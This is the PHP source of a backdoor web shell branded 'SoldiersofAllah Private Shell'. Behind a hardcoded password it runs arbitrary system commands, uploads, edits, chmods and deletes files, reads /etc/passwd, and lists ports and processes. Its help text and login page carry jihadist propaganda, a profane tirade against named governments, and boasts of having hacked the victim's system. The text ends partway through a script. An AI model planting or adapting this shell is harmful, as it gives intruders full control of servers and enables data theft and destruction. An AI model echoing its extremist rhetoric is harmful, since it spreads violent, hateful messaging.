<?php
session_start();

error_reporting(0);
set_time_limit(9999999);

$auth=1;
$version = "1.0";

$functions = array('Clear Screen' => 'ClearScreen()',
'Clear History' => 'ClearHistory()',
'Can I function?' => "runcommand('canirun','GET')",
'Get server info' => "runcommand('showinfo','GET')",
'Read /etc/passwd' => "runcommand('etcpasswdfile','GET')",
'Open ports' => "runcommand('netstat -an | grep -i listen','GET')",
'Running processes' => "runcommand('ps -aux','GET')",
'Readme' => "runcommand('shellhelp','GET')"


);
$thisfile = basename(__FILE__);

$style = '<style type="text/css">
.cmdthing {
    border-top-width: 0px;
    font-weight: bold;
    border-left-width: 0px;
    font-size: 10px;
    border-left-color: #000000;
    background: #000000;
    border-bottom-width: 0px;
    border-bottom-color: #FFFFFF;
    color: #FFFFFF;
    border-top-color: #008000;
    font-family: verdana;
    border-right-width: 0px;
    border-right-color: #000000;
}
input,textarea {
    border-top-width: 1px;
    font-weight: bold;
    border-left-width: 1px;
    font-size: 10px;
    border-left-color: #FFFFFF;
    background: #000000;
    border-bottom-width: 1px;
    border-bottom-color: #FFFFFF;
    color: #FFFFFF;
    border-top-color: #FFFFFF;
    font-family: verdana;
    border-right-width: 1px;
    border-right-color: #FFFFFF;
}
A:hover {
text-decoration: none;
}


table,td,div {
border-collapse: collapse;
border: 1px solid #FFFFFF;
}
body {
color: #FFFFFF;
font-family: verdana;
}
</style>';
$password='alqaeda';
$sess = __FILE__.$password;
if(isset($_POST['p4ssw0rD']))
{
	if($_POST['p4ssw0rD'] == $password)
	{
		$_SESSION[$sess] = $_POST['p4ssw0rD'];
	}
	else
	{
		die("Wrong password");
	}

}
if($_SESSION[$sess] == $password)
{
	if(isset($_SESSION['workdir']))
	{
			if(file_exists($_SESSION['workdir']) && is_dir($_SESSION['workdir']))
		{
			chdir($_SESSION['workdir']);
		}
	}

	if(isset($_FILES['uploadedfile']['name']))
	{
		$target_path = "./";
		$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); 
		if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
			
		}
	}

	if(isset($_GET['runcmd']))
	{

		$cmd = $_GET['runcmd'];

		print "<b>".get_current_user()."~# </b>". htmlspecialchars($cmd)."<br>";

		if($cmd == "")
		{
			print "Empty Command..type \"shellhelp\" for some ehh...help";
		}

		elseif($cmd == "upload")
		{
			print '<br>Uploading to: '.realpath(".");
			if(is_writable(realpath(".")))
			{
				print "<br><b>I can write to this directory</b>";
			}
			else
			{
				print "<br><b><font color=red>I can't write to this directory, please choose another one.</b></font>";
			}

		}
		elseif((ereg("changeworkdir (.*)",$cmd,$file)) || (ereg("cd (.*)",$cmd,$file)))
		{
				if(file_exists($file[1]) && is_dir($file[1]))
				{
					chdir($file[1]);
					$_SESSION['workdir'] = $file[1];
					print "Current directory changed to ".$file[1];
				}
			else
			{
				print "Directory not found";
			}
		}

		elseif(strtolower($cmd) == "shellhelp")
		{
print '<b><font size=5><center>In The Name Of Allah<center></b></font>
&copy; by SoldiersofAllah

We are here..
Because this is our ideologi and our breath
<br><br>
Jihad is our way!!!
Die as Syuhada or be a good moslem...
<br><br>
<font color="green">free for Palestine,iraq,Afghanistan,somalia,and every moslem country</font><br><br>
<font color="red">No respect for nasionalism,democracy,capitalism,liberalism,n All ideology what contradiction in Al-Quran and sunnah
Fuck to Israel,USA,UK,Indonesian government,Saudi government And Every government who always hating every mujahideen</font>

=[]= Soldiers of Allah was here and controlling your system =[]=
			';

		}
		elseif(ereg("editfile (.*)",$cmd,$file))
		{
			if(file_exists($file[1]) && !is_dir($file[1]))
			{
				print "<form name=\"saveform\"><textarea cols=70 rows=10 id=\"area1\">";
				$contents = file($file[1]);
					foreach($contents as $line)
					{
						print htmlspecialchars($line);
					}
				print "</textarea><br><input size=80 type=text name=filetosave value=".$file[1]."><input value=\"Save\" type=button onclick=\"SaveFile();\"></form>";
			}
			else
			{
			print "File not found.";
			}
		}
		elseif(ereg("deletefile (.*)",$cmd,$file))
		{
			if(is_dir($file[1]))
			{
				if(rmdir($file[1]))
				{
					print "Directory succesfully deleted.";
				}
				else
				{
					print "Couldn't delete directory!";
				}
			}
			else
			{
				if(unlink($file[1]))
				{
					print "File succesfully deleted.";
				}
				else
				{
					print "Couldn't delete file!";
				}
			}
		}
		elseif(strtolower($cmd) == "canirun")
		{
		print "If any of these functions is Enabled, the shell will function like it should.<br>";
			if(function_exists(passthru))
			{
				print "Passthru: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "Passthru: <b><font color=red>Disabled</b></font><br>";
			}

			if(function_exists(exec))
			{
				print "Exec: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "Exec: <b><font color=red>Disabled</b></font><br>";
			}

			if(function_exists(system))
			{
				print "System: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "System: <b><font color=red>Disabled</b></font><br>";
			}
			if(function_exists(shell_exec))
			{
				print "Shell_exec: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "Shell_exec: <b><font color=red>Disabled</b></font><br>";
			}
		print "<br>Safe mode will prevent some stuff, maybe command execution, if you're looking for a <br>reason why the commands aren't executed, this is probally it.<br>";
		if( ini_get('safe_mode') ){
			print "Safe Mode: <b><font color=red>Enabled</b></font>";
		}
			else
		{
			print "Safe Mode: <b><font color=green>Disabled</b></font>";
		}
		print "<br><br>Open_basedir will block access to some files you <i>shouldn't</i> access.<br>";
			if( ini_get('open_basedir') ){
				print "Open_basedir: <b><font color=red>Enabled</b></font>";
			}
			else
			{
				print "Open_basedir: <b><font color=green>Disabled</b></font>";
			}
		}
		//About the shell
		elseif(ereg("listdir (.*)",$cmd,$directory))
		{

			if(!file_exists($directory[1]))
			{
				die("Directory not found");
			}
			//Some variables
			chdir($directory[1]);
			$i = 0; $f = 0;
			$dirs = "";
			$filez = "";
			
				if(!ereg("/$",$directory[1])) //Does it end with a slash?
				{
					$directory[1] .= "/"; //If not, add one
				}
			print "Listing directory: ".$directory[1]."<br>";
			print "<table border=0><td><b>Directories</b></td><td><b>Files</b></td><tr>";
			
			if ($handle = opendir($directory[1])) {
			   while (false !== ($file = readdir($handle))) {
				   if(is_dir($file))
				   {
					   $dirs[$i]  = $file;
					   $i++;
				   }
				   else
				   {
					   $filez[$f] = $file;
					   $f++;
				   }
				   
			   }
			   print "<td>";
			   
			   foreach($dirs as $directory)
			   {
					print "<i style=\"cursor:crosshair\" onclick=\"deletefile('".realpath($directory)."');\">[D]</i><i style=\"cursor:crosshair\" onclick=\"runcommand('changeworkdir ".realpath($directory)."','GET');\">[W]</i><b style=\"cursor:crosshair\" onclick=\"runcommand('clear','GET'); runcommand ('listdir ".realpath($directory)."','GET'); \">".$directory."</b><br>";
			   }
			   
			   print "</td><td>";
			   
			   foreach($filez as $file)
			   {
				print "<i style=\"cursor:crosshair\" onclick=\"deletefile('".realpath($file)."');\">[D]</i><u style=\"cursor:crosshair\" onclick=\"runcommand('editfile ".realpath($file)."','GET');\">".$file."</u><br>";
			   }
			   
			   print "</td></table>";
			}
		}
		elseif(strtolower($cmd) == "about")
		{
			print "Soldiers of Allah private shell.<br>Version $version";
		}
		//Show info
		elseif(strtolower($cmd) == "showinfo")
		{
			if(function_exists(disk_free_space))
			{
				$free = disk_free_space("/") / 1000000;
			}
			else
			{
				$free = "N/A";
			}
			if(function_exists(disk_total_space))
			{
				$total = trim(disk_total_space("/") / 1000000);
			}
			else
			{
				$total = "N/A";
			}
			$path = realpath (".");
			
			print "<b>Free:</b> $free / $total MB<br><b>Current path:</b> $path<br><b>Uname -a Output:</b><br>";
			
			if(function_exists(passthru))
			{
				passthru("uname -a");
			}
			else
			{
				print "Passthru is disabled :(";
			}
		}
		//Read /etc/passwd
		elseif(strtolower($cmd) == "etcpasswdfile")
		{

			$pw = file('/etc/passwd/');
			foreach($pw as $line)
			{
				print $line;
			}


		}
		//Execute any other command
		else
		{

			if(function_exists(passthru))
			{
				passthru($cmd);
			}
			else
			{
				if(function_exists(exec))
				{
					exec("ls -la",$result);
					foreach($result as $output)
					{
						print $output."<br>";
					}
				}
				else
				{
				if(function_exists(system))
				{
					system($cmd);
				}
				else
				{
					if(function_exists(shell_exec))
					{
						print shell_exec($cmd);
					}
						else
						{
						print "Sorry, none of the command functions works.";
						}
					}
				}
			}
		}
	}

	elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST['filecontent']))
	{
		$file = $_POST['filetosave'];
		if(!is_writable($file))
		{
			if(!chmod($file, 0777))
			{
				die("Nope, can't chmod nor save :("); //In fact, nobody ever reads this message ^_^
			}
		}
		
		$fh = fopen($file, 'w');
		$dt = $_POST['filecontent'];
		fwrite($fh, $dt);
		fclose($fh);
	}
	else
	{
?>
<html>

<title>SoldiersofAllah Private Shell | Edited By KingDefacer ~ <?php print getenv("HTTP_HOST"); ?></title>
<head>
<?php print $style; ?>
<SCRIPT TYPE="text/javascript">
function sf(){document.cmdform.command.focus();}
var outputcmd = "";
var cmdhistory = "";
function ClearScreen()
{
	outputcmd = "";
	document.getElementById('output').innerHTML = outputcmd;
}

function ClearHistory()
{
	cmdhistory = "";
	document.getElementById('history').innerHTML = cmdhistory;
}

function deletefile(file)
{
	deleteit = window.confirm("Are you sure you want to delete\n"+file+"?");
	if(deleteit)
	{
		runcommand('deletefile ' + file,'GET');
	}
}

var http_request = false;
function makePOSTRequest(url, parameters) {
  http_request = false;
  if (window.XMLHttpRequest) {
	 http_request = new XMLHttpRequest();
	 if (http_request.overrideMimeType) {
		http_request.overrideMimeType('text/html');
	 }
  } else if (window.ActiveXObject) {
	 try {
		http_request = new ActiveXObject("Msxml2.XMLHTTP");
	 } catch (e) {
		try {
		   http_request = new ActiveXObject("Microsoft.XMLHTTP");
		} catch (e) {}
	 }
  }
  if (!http_request) {
	 alert('Cannot create XMLHTTP instance');
	 return false;
  }
  

  http_request.open('POST', url, true);
  http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  http_request.setRequestHeader("Content-length", parameters.length);
  http_request.setRequestHeader("Connection", "close");
  http_request.send(parameters);
}


function SaveFile()
{
var poststr = "filetosave=" + encodeURI( document.saveform.filetosave.value ) +
                    "&filecontent=" + encodeURI( document.getElementById("area1").value );
makePOSTRequest('<?php print $ThisFile; ?>?savefile', poststr);
document.getElementById('output').innerHTML = document.getElementById('output').innerHTML + "<br><b>Saved! If it didn't save, you'll need to chmod the file to 777 yourself,<br> however the script tried to chmod it automaticly.";
}

function runcommand(urltoopen,action,contenttosend){
cmdhistory = "<br>&nbsp;<i style=\"cursor:crosshair\" onclick=\"document.cmdform.command.value='" + urltoopen + "'\">" + urltoopen + "</i> " + cmdhistory;
document.getElementById('history').innerHTML = cmdhistory;
if(urltoopen == "clear")
{
ClearScreen();
}
    var ajaxRequest;
    try{
        ajaxRequest = new XMLHttpRequest();
    } catch (e){
        try{
            ajaxRequest = new ActiveXObject("Msxml2.XMLHTTP");
        } catch (e) {
            try{
                ajaxRequest = new ActiveXObject("Microsoft.XMLHTTP");
            } catch (e){
                alert("Wicked error, nothing we can do about it...");
                return false;
            }
        }
    }
    ajaxRequest.onreadystatechange = function(){
        if(ajaxRequest.readyState == 4){
        outputcmd = "<pre>"  + outputcmd + ajaxRequest.responseText +"</pre>";
            document.getElementById('output').innerHTML = outputcmd;
            var objDiv = document.getElementById("output");
			objDiv.scrollTop = objDiv.scrollHeight;
        }
    }
    ajaxRequest.open(action, "?runcmd="+urltoopen , true);
	if(action == "GET")
	{
    ajaxRequest.send(null);
	}
    document.cmdform.command.value='';
    return false;
}

function set_tab_html(newhtml)
{
document.getElementById('commandtab').innerHTML = newhtml;
}

function set_tab(newtab)
{
	if(newtab == "cmd")
	{
		newhtml = '&nbsp;&nbsp;&nbsp;<form name="cmdform" onsubmit="return runcommand(document.cmdform.command.value,\'GET\');"><b>Command</b>: <input type=text name=command class=cmdthing size=100%><br></form>';
	}
	else if(newtab == "upload")
	{
		runcommand('upload','GET');
		newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enctype="multipart/form-data" action="<?php print $ThisFile; ?>" method="POST"><input type="hidden" name="MAX_FILE_SIZE" value="10000000" />Choose a file to upload: <input name="uploadedfile" type="file" /><br /><input type="submit" value="Upload File" /></form></font>';
	}
	else if(newtab == "workingdir")
	{
		<?php
		$folders = "<form name=workdir onsubmit=\"return runcommand(\'changeworkdir \' + document.workdir.changeworkdir.value,\'GET\');\"><input size=80% type=text name=changeworkdir value=\"";
		$pathparts = explode("/",realpath ("."));
		foreach($pathparts as $folder)
		{
		$folders .= $folder."/";
		}
		$folders .= "\"><input type=submit value=Change></form><br>Script directory: <i style=\"cursor:crosshair\"  onclick=\"document.workdir.changeworkdir.value=\'".dirname(__FILE__)."\'>".dirname(__FILE__)."</i>";

		?>
		newhtml = '<?php print $folders; ?>';
	}
	else if(newtab == "filebrowser")
	{
		newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>You can use it to change your working directory easily, don\'t expect too much of it.<br>Click on a file to edit it.<br><i>[W]</i> = set directory as working directory.<br><i>[D]</i> = delete file/directory';
		runcommand('listdir .','GET');
	}
	else if(newtab == "createfile")
	{
		newhtml = '<b>File Editor, under construction.</b>';
		document.getElementById('output').innerHTML = "<form name=\"saveform\"><textarea cols=70 rows=10 id=\"area1\"></textarea><br><input size=80 type=text name=filetosave value=\"<?php print realpath('.')."/".rand(1000,999999).".txt"; ?>\"><input value=\"Save\" type=button onclick=\"SaveFile();\"></form>";
		
	}
		document.getElementById('commandtab').innerHTML = newhtml;
}
</script>
</head>
<body bgcolor=black onload="sf();" vlink=white alink=white link=white>
<table border=1 width=100% height=100%>
<td width=15% valign=top>

<form name="extras"><br>
<center><b>Quick Linux/Unix Commands</b><br>

<div style='margin: 0px;padding: 0px;border: 1px inset;overflow: auto'>
<?php
foreach($functions as $name => $execute)
{
print '&nbsp;<input type="button" value="'.$name.'" onclick="'.$execute.'"><br>';
}
?>

</center>

</div>
</form>
<center><b>Command history</b><br></center>
<div id="history" style='margin: 0px;padding: 0px;border: 1px inset;width: 100%;height: 20%;text-align: left;overflow: auto;font-size: 10px;'></div>
<br>
<center><b>About US</b><br></center>
<div style='margin: 0px;padding: 0px;border: 1px inset;width: 100%;text-align: center;overflow: auto; font-size: 10px;'>
<br>
<b><font size=3 color="green">SoldiersOfAllah private shell</b></font><br>Modified by cyberkalashnikov
<br>
Version <?php print $version; ?>

<br>
<br>
<center><font size="2">In The Name Of Allah</font></center>
Dedicated for all of SoldiersOfAllah members

</div>

</td>
<td width=70%>
<table border=0 width=100% height=100%><td id="tabs" height=1%><font size=0>
<b style="cursor:crosshair" onclick="set_tab('cmd');">[Execute command]</b> 
<b style="cursor:crosshair" onclick="set_tab('upload');">[Upload file]</b> 
<b style="cursor:crosshair" onclick="set_tab('workingdir');">[Change directory]</b> 
<b style="cursor:crosshair" onclick="set_tab('filebrowser');">[Filebrowser]</b> 
<b style="cursor:crosshair" onclick="set_tab('createfile');">[Create File]</b> 

</font></td>
<tr>
<td height=99% width=100% valign=top><div id="output" style='height:100%;white-space:pre;overflow:auto'></div>

<tr>
<td  height=1% width=100% valign=top>
<div id="commandtab" style='height:100%;white-space:pre;overflow:auto'>
&nbsp;&nbsp;&nbsp;<form name="cmdform" onsubmit="return runcommand(document.cmdform.command.value,'GET');">
<b>Command</b>: <input type=text name=command class=cmdthing size=100%><br>
</form>
</div>
</td>
</table>
</td>
</table>
</body>
</html>



<?php
}
} 

else {
?>
<html>
<title>Login Step ~ <?php print getenv("HTTP_HOST"); ?></title>
<style type="text/css">
/* Circle Text Styles */
#outerCircleText {
/* Optional - DO NOT SET FONT-SIZE HERE, SET IT IN THE SCRIPT */
font-style: italic;
font-weight: bold;
font-family: 'comic sans ms', verdana, arial;
color: #ff0000;
/* End Optional */
/* Start Required - Do Not Edit */
position: absolute;top: 0;left: 0;z-index: 3000;cursor: default;}
#outerCircleText div {position: relative;}
#outerCircleText div div {position: absolute;top: 0;left: 0;text-align: center;}
/* End Required */
/* End Circle Text Styles */
</style>
<script type="text/javascript">

;(function(){

var msg = "";
var size = 24;
var circleY = 0.75; var circleX = 2;
var letter_spacing = 5;
var diameter = 10;

var rotation = 0.4;
var speed = 0.3;
////////////////////// Stop Editing //////////////////////
if (!window.addEventListener && !window.attachEvent || !document.createElement) return;
msg = msg.split(');
var n = msg.length - 1, a = Math.round(size * diameter * 0.208333), currStep = 20,
ymouse = a * circleY + 20, xmouse = a * circleX + 20, y = [], x = [], Y = [], X = [],
o = document.createElement('div'), oi = document.createElement('div'),
b = document.compatMode && document.compatMode != "BackCompat"? document.documentElement : document.body,
mouse = function(e){
e = e || window.event;
ymouse = !isNaN(e.pageY)? e.pageY : e.clientY; // y-position
xmouse = !isNaN(e.pageX)? e.pageX : e.clientX; // x-position
},
makecircle = function(){ // rotation/positioning
if(init.nopy){
o.style.top = (b || document.body).scrollTop + 'px';
o.style.left = (b || document.body).scrollLeft + 'px';
};
currStep -= rotation;
for (var d, i = n; i > -1; --i){ // makes the circle
d = document.getElementById('iemsg' + i).style;
d.top = Math.round(y[i] + a * Math.sin((currStep + i) / letter_spacing) * circleY - 15) + 'px';
d.left = Math.round(x[i] + a * Math.cos((currStep + i) / letter_spacing) * circleX) + 'px';
};
},
drag = function(){ // makes the resistance
y[0] = Y[0] += (ymouse - Y[0]) * speed;
x[0] = X[0] += (xmouse - 20 - X[0]) * speed;
for (var i = n; i > 0; --i){
y[i] = Y[i] += (y[i-1] - Y[i]) * speed;
x[i] = X[i] += (x[i-1] - X[i]) * speed;
};
makecircle();
},
init = function(){ 
if(!isNaN(window.pageYOffset)){
ymouse += window.pageYOffset;
xmouse += window.pageXOffset;
} else init.nopy = true;
for (var d, i = n; i > -1; --i){
d = document.createElement('div'); d.id = 'iemsg' + i;
d.style.height = d.style.width = a + 'px';
d.appendChild(document.createTextNode(msg[i]));
oi.appendChild(d); y[i] = x[i] = Y[i] = X[i] = 0;
};
o.appendChild(oi); document.body.appendChild(o);
setInterval(drag, 25);
},
ascroll = function(){
ymouse += window.pageYOffset;
xmouse += window.pageXOffset;
window.removeEventListener('scroll', ascroll, false);
};
o.id = 'outerCircleText'; o.style.fontSize = size + 'px';
if (window.addEventListener){
window.addEventListener('load', init, false);
document.addEventListener('mouseover', mouse, false);
document.addEventListener('mousemove', mouse, false);
if (/Apple/.test(navigator.vendor))
window.addEventListener('scroll', ascroll, false);
}
else if (window.attachEvent){
window.attachEvent('onload', init);
document.attachEvent('onmousemove', mouse);
};
})();
</script>

</head>
<body>
<script>

var text=new Array()
var textsplashcolors=new Array()


text[0]=""
text[1]=""
text[2]=""
text[3]=""
text[4]=""
text[5]=""

 
textsplashcolors[0]="Black"
textsplashcolors[1]="Black"
textsplashcolors[2]="Black"
textsplashcolors[3]="Black"
textsplashcolors[4]="Black"
textsplashcolors[5]="Black"
textsplashcolors[6]="Black"

// the font
var textfont="Ayasmonika"

// the font-size for IE4x/5x/6x and NS6x (CSS-standard)
var textfontsize=14

// the font size for NS4x (HTML-standard)
var textfontsizeHTML=4

// the pause between the messages (seconds)
var textpause=2

// Do not edit below this line
var textweight="bold"
var textweightA="<b>"
var textweightB="</b>"
var textitalic="normal"
var textitalicA=""
var textitalicB=""
var textalignabsolute="topcenter"
var letterwidth=new Array()
var messagewidth=0
var messageheight=1
var i_colors=0
var letterspace=Math.floor(textfontsize/1.3)
var timer
var i_text=0
var textsplitted
var i_textpath=0
var endpause=1
var endpausemilli=endpause*10
var maxtextlength=0
var i_endposition=0
var windowwidth=0
var windowheight=0
var windowwidthfactor=1
var windowheightfactor=1
var i_span=0
var startposmax_x=0
var startposmax_y=0
textpause*=1000
var x_step=new Array()
var y_step=new Array()
var x_finalpos=new Array()
var y_finalpos=0
var max_loop=20
var i_loop=0

var ns4=document.layers?1:0
var ns6=document.getElementById&&!document.all?1:0 
var ie=document.all?1:0

for (i=0;i<=text.length-1;i++) {
	if (text[i].length>=maxtextlength) {maxtextlength=text[i].length}
}
for (i=0;i<=text.length-1;i++) {
	text[i]=text[i]+" "
}

var xpos=new Array()
for (i=0;i<=maxtextlength;i++) {
	xpos[i]=5000
}

var ypos=new Array()
for (i=0;i<=maxtextlength;i++) {
	ypos[i]=5000
}

function randomizer(range) {		
	return Math.floor(range*Math.random())
}

function getpagesize() {
	if (ie) {
		windowheight=parseInt(document.body.clientHeight)
		windowwidth=parseInt(document.body.clientWidth)
	}
	if (ns4 || ns6) {
		windowheight=parseInt(window.innerHeight)
		windowwidth=parseInt(window.innerWidth)
	}
	startposmax_x=windowwidth-2*parseInt(textfontsize)
	startposmax_y=windowheight-2*parseInt(textfontsize)

	changecontent()
}

function changecontent() {
		messagewidth=0
		var textsa=text[i_text]
		textsplitted=textsa.split("")
		if (ie) {
			for (i=0;i<=textsplitted.length-1;i++) {
				var thisspan=eval("document.all.span"+i)
    			thisspan.innerHTML="<span style='font-family:"+textfont+";font-size:"+textfontsize+";font-style:"+textitalic+";font-weight:"+textweight+";color:"+textsplashcolors[i_colors]+";text-align:center'>"+textsplitted[i]+"</span>"
				i_colors++
				if (i_colors>textsplashcolors.length-1) {i_colors=0}
				letterwidth[i]=Math.round(thisspan.offsetWidth*1.2)
				
				if (letterwidth[i]==0) {letterwidth[i]=parseInt(textfontsize)}
				messagewidth+=letterwidth[i]
				messageheight=Math.round(document.all.span0.offsetHeight)
			}
		}
		if (ns6) {
			for (i=0;i<=textsplitted.length-1;i++) {
				var thisspan=eval(document.getElementById('span'+i))
    			thisspan.innerHTML="<span style='font-family:"+textfont+";font-size:"+textfontsize+";font-style:"+textitalic+";font-weight:"+textweight+";color:"+textsplashcolors[i_colors]+"'>"+textsplitted[i]+"</span>"
				i_colors++
				if (i_colors>textsplashcolors.length-1) {i_colors=0}
				letterwidth[i]=Math.round(parseInt(thisspan.offsetWidth)*1.2)
				if (letterwidth[i]==0) {letterwidth[i]=textfontsize}
				messagewidth+=letterwidth[i]
				messageheight=Math.round(document.getElementById('span0').offsetHeight)
			}
			
		}
		if (ns4) {
			for (i=0; i<textsplitted.length-1; i++) {
    			var thisspan=eval("document.span"+i+".document")
    			thisspan.write("<p><font size="+textfontsizeHTML+" color="+textsplashcolors[i_colors]+" face="+textfont+">"+textitalicA+textweightA+textsplitted[i]+textweightB+textitalicB+"</font></p>")
				thisspan.close()
				letterwidth[i]=Math.round(thisspan.width*1.2)
				if (letterwidth[i]==0) {letterwidth[i]=textfontsize}
				messagewidth+=letterwidth[i]
				messageheight=Math.round(document.span0.document.height)
				thisspan.clear()
				i_colors++
				if (i_colors>textsplashcolors.length-1) {i_colors=0}
    		}
			for (i=0; i<textsplitted.length-1; i++) {
    			var thisspan=eval("document.span"+i)
    			thisspan.visibility="show"
    		}
		}
		i_text++ 
		if (i_text>=text.length) {i_text=0}
		getfinalpos()
}

function getfinalpos() {
	if (ie || ns6) {var padding_x=100}; if (ns4) {var padding_x=40};
	if (ie || ns6) {var padding_y=80}; if (ns4) {var padding_y=40};
	if (textalignabsolute=="middlecenter") {
		x_finalpos[0]=(windowwidth-messagewidth)/2
		y_finalpos=(windowheight-messageheight)/2
	}
	else if (textalignabsolute=="topleft") {
		x_finalpos[0]=5
		y_finalpos=0
	}
	else if (textalignabsolute=="topcenter") {
		x_finalpos[0]=(windowwidth-messagewidth)/2
		y_finalpos=0
	}
	else if (textalignabsolute=="topright") {
		x_finalpos[0]=windowwidth-messagewidth
		y_finalpos=0
	}
	else if (textalignabsolute=="bottomleft") {
		x_finalpos[0]=5
		y_finalpos=windowheight-messageheight
	}
	else if (textalignabsolute=="bottomcenter") {
		x_finalpos[0]=(windowwidth-messagewidth)/2
		y_finalpos=windowheight-messageheight
	}
	else if (textalignabsolute=="bottomright") {
		x_finalpos[0]=windowwidth-messagewidth
		y_finalpos=windowheight-messageheight
	}
	for (i=1;i<textsplitted.length-1;i++) {
		x_finalpos[i]=x_finalpos[i-1]+letterwidth[i-1]
	}
	gotostartpos()
}

function gotostartpos() {
	if (ie) {
		for (i=0;i<textsplitted.length-1;i++) {
			var thisspan=eval("document.all.span"+i+".style")
			thisspan.posLeft=randomizer(startposmax_x)
			thisspan.posTop=randomizer(startposmax_y)
		}
	}
	if (ns4) {
		for (i=0;i<textsplitted.length-1;i++) {
			var thisspan=eval("document.span"+i)
			thisspan.left=randomizer(startposmax_x)
			thisspan.top=randomizer(startposmax_y)
		}
	}
	if (ns6) {
		for (i=0;i<textsplitted.length-1;i++) {
			var thisspan=eval("document.getElementById('span'+i).style")
			thisspan.left=randomizer(startposmax_x)
			thisspan.top=randomizer(startposmax_y)
		}
	}
	gotostandstillpos()
}

function gotostandstillpos() {
	if (ie) {
		if (i_loop<=max_loop-1) {
			for (i=0;i<textsplitted.length-1;i++) {
				var thisspan=eval("document.all.span"+i+".style")
				x_step[i]=(x_finalpos[i]-thisspan.posLeft)/(max_loop-i_loop)
				y_step[i]=(y_finalpos-thisspan.posTop)/(max_loop-i_loop)		
				thisspan.posLeft+=x_step[i]
				thisspan.posTop+=y_step[i]
			}
			i_loop++
			var timer=setTimeout("gotostandstillpos()",20)
		}
		else {
			i_loop=0
			clearTimeout(timer)
			timer=setTimeout("gotoendpos()",textpause)
		}
	}
	if (ns4) {
		if (i_loop<=max_loop-1) {
			for (i=0;i<textsplitted.length-1;i++) {
				var thisspan=eval("document.span"+i)
				x_step[i]=(x_finalpos[i]-thisspan.left)/(max_loop-i_loop)
				y_step[i]=(y_finalpos-thisspan.top)/(max_loop-i_loop)		
				thisspan.left+=x_step[i]
				thisspan.top+=y_step[i]
			}
			i_loop++
			var timer=setTimeout("gotostandstillpos()",20)
		}
		else {
			i_loop=0
			clearTimeout(timer)
			timer=setTimeout("gotoendpos()",textpause)
		}
	}
	if (ns6) {
		if (i_loop<=max_loop-1) {
			for (i=0;i<textsplitted.length-1;i++) {
				var thisspan=eval("document.getElementById('span'+i).style")
				x_step[i]=(x_finalpos[i]-parseInt(thisspan.left))/(max_loop-i_loop)
				y_step[i]=(y_finalpos-parseInt(thisspan.top))/(max_loop-i_loop)		
				thisspan.left=parseInt(thisspan.left)+x_step[i]
				thisspan.top=parseInt(thisspan.top)+y_step[i]
			}
			i_loop++
			var timer=setTimeout("gotostandstillpos()",20)
		}
		else {
			i_loop=0
			clearTimeout(timer)
			timer=setTimeout("gotoendpos()",textpause)
		}
	}
}

function gotoendpos() {
	if (ie) {
		if (i_loop<=textsplitted.length-1) {
			var thisspan=eval("document.all.span"+i_loop+".style")
			thisspan.posLeft=-1000
			i_loop++
			var timer=setTimeout("gotoendpos()",10)
		}
		else {
			clearTimeout(timer)
			i_loop=0
			var timer=setTimeout("changecontent()",400)
		}
	}
	if (ns4) {
		if (i_loop<=textsplitted.length-1) {
			var thisspan=eval("document.span"+i_loop)
			thisspan.left=-1000
			i_loop++
			var timer=setTimeout("gotoendpos()",10)
		}
		else {
			clearTimeout(timer)
			i_loop=0
			changecontent()
		}
	}
	
	if (ns6) {
		if (i_loop<=textsplitted.length-1) {
			var thisspan=eval("document.getElementById('span'+i_loop).style")
			thisspan.left=-1000
			i_loop++
			var timer=setTimeout("gotoendpos()",10)
		}
		else {
			clearTimeout(timer)
			i_loop=0
			changecontent()
		}
	}
}

if (ie) {
	for (i=0;i<=maxtextlength;i++) {
    	document.write("<span id='span"+i+"' style='position:absolute'>")
		
    	document.write("</span>")
	}
	window.onload=getpagesize
}
if (ns6) {
	for (i=0;i<=maxtextlength;i++) {
    	document.write("<span id='span"+i+"' style='position:absolute'>")
		document.write(textsplitted)
    	document.write("</span>")
	}
	window.onload=getpagesize
}
if (ns4) {
	for (i=0;i<=maxtextlength;i++) {
    	document.write("<layer name='span"+i+"' visibility=hide>")
		document.write(textsplitted)
    	document.write("</layer>")
	}
	window.onload=getpagesize
}
var backgroundcolor="black"
</script>
<center>
<br><br>
<img src="http://i335.photobucket.com/albums/m469/dna_keylogger/t.jpg" border="0" alt="Tawheed"></a>
<style type="text/css">td{color:#000000;font-size:10pt;font-family:Arial;}input,option{background-color:#FFFFAA;font-family:Arial;}</style>

<center>
<script>
var message=new Array()
message[0]="Welcome to Soldiers of Allah Shell"
message[1]="Before You Use This Stuff"
message[2]="Please Login Before"
message[3]="Soldiers of Allah has been hacked Your system"

// enter the width and height of the ticker (pixel)
var tickerwidth=750
var tickerheight=350

// enter font
var tickerfont="Arial"

// enter font-size
var tickerfontsize=6

// enter the three font-colors
var tickerfontcolorpre="White"
var tickerfontcolormark="Green"
var tickerfontcolorafter="Gold"

// enter the background-color
var backgroundcolor="black"

// enter the pause between each word marked (1000 = 1 second)
var pausebetweenwords=200 

// enter the pause between each message (1000 = 1 second)
var pausebetweenmessages=1000

// enter the pause after the fade effect (1000 = 1 second)
var pauseafterfade=1000

// do not edit the code below this line
var transparency=100
var transparencystep=5
var windowheight=0
var windowwidth=0
var x_pos=0
var y_pos=0
var i_message=-1
var messagesplit=""
var i_messagesplit=0
var i_mark=0
var tickercontent
var pausefade=40
var linkurlloaded=false
var oneloopfinished=false
var ns4=document.layers?1:0
var ns6=document.getElementById&&!document.all?1:0 
var ie=document.all?1:0

function splitmessage() {
	transparency=100
	if (ie) {
		i_message++
		if (i_message>=message.length) {oneloopfinished=true}
		if (i_message>=message.length) {i_message=0}
		i_mark=0
		messagesplit=message[i_message].split(" ")
		for (i=0;i<messagesplit.length;i++) {
			messagesplit[i]=messagesplit[i]+" "
		}
		messagesplit[messagesplit.length]=" "

		document.all.ticker.filters.alpha.opacity=transparency
		if (oneloopfinished && linkurlloaded) {
			document.location.href=linkurl
		}
		else {
			runticker()
		}
	}
	else if (ns6 || ns4) {
		i_message++
		if (i_message>=message.length) {document.location.href=linkurl}
		else {
			i_mark=0
